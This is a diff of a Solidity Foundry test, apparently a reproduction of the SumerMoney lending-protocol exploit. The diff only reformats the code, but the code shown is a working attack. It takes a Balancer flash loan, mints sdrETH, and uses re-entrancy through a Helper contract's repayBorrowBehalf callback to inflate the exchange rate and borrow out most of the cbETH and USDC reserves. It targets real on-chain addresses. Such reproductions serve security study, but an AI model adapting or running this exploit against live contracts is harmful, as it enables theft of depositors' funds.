@@ -24,24 +24,22 @@ import {ICErc20Delegate} from "src/interfaces/ICErc20Delegate.sol";
 // Hacking God :
 
 interface IClaimer {
+
     function claim(uint256[] calldata tokenIds) external;
+
 }
 
 contract SumerMoney is Test {
+
     uint256 blocknumToForkFrom = 13_076_768;
 
-    IBalancerVault Balancer =
-        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IWETH WETH =
-        IWETH(payable(address(0x4200000000000000000000000000000000000006)));
+    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
     IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
     IERC20 cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
-    crETH sdrETH =
-        crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
-    ICErc20Delegate sdrUSDC =
-        ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
-    ICErc20Delegate sdrcbETH =
-        ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
+    crETH sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
+    ICErc20Delegate sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
+    ICErc20Delegate sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
     IClaimer claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);
     Helper helper;
 
@@ -68,16 +66,8 @@ contract SumerMoney is Test {
         bytes memory userData = "";
         Balancer.flashLoan(address(this), tokens, amounts, userData);
 
-        emit log_named_decimal_uint(
-            "Attacker USDC Balance After exploit",
-            USDC.balanceOf(address(this)),
-            6
-        );
-        emit log_named_decimal_uint(
-            "Attacker cbETH Balance After exploit",
-            cbETH.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("Attacker cbETH Balance After exploit", cbETH.balanceOf(address(this)), 18);
     }
 
     function receiveFlashLoan(
@@ -89,11 +79,7 @@ contract SumerMoney is Test {
         WETH.withdraw(amounts[0]);
 
         // sdrETH.exchangeRate
-        emit log_named_decimal_uint(
-            "Before re-enter, sdrETH exchangeRate",
-            sdrETH.exchangeRateCurrent(),
-            18
-        );
+        emit log_named_decimal_uint("Before re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);
 
         sdrETH.mint{value: amounts[0]}();
 
@@ -109,11 +95,7 @@ contract SumerMoney is Test {
     function attack() external {
         // exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply
         // In function repayBorrowBehalf(), getCashPrior() increase 150 ether but totalBorrows not decreased due to re-enter
-        emit log_named_decimal_uint(
-            "In re-enter, sdrETH exchangeRate",
-            sdrETH.exchangeRateCurrent(),
-            18
-        );
+        emit log_named_decimal_uint("In re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);
 
         sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));
         sdrUSDC.borrow(USDC.balanceOf(address(sdrUSDC)) - 645_000 * 1e6);
@@ -125,20 +107,18 @@ contract SumerMoney is Test {
     }
 
     receive() external payable {}
+
 }
 
 contract Helper {
+
     address owner;
-    IWETH WETH =
-        IWETH(payable(address(0x4200000000000000000000000000000000000006)));
+    IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
     IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
     IERC20 cbETH = IERC20(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
-    crETH sdrETH =
-        crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
-    ICErc20Delegate sdrUSDC =
-        ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
-    ICErc20Delegate sdrcbETH =
-        ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
+    crETH sdrETH = crETH(payable(address(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)));
+    ICErc20Delegate sdrUSDC = ICErc20Delegate(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
+    ICErc20Delegate sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
     IClaimer claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);
 
     constructor() payable {
@@ -166,4 +146,5 @@ contract Helper {
             (bool success4,) = owner.call(abi.encodeWithSignature("attack()"));
         }
     }
+
 }
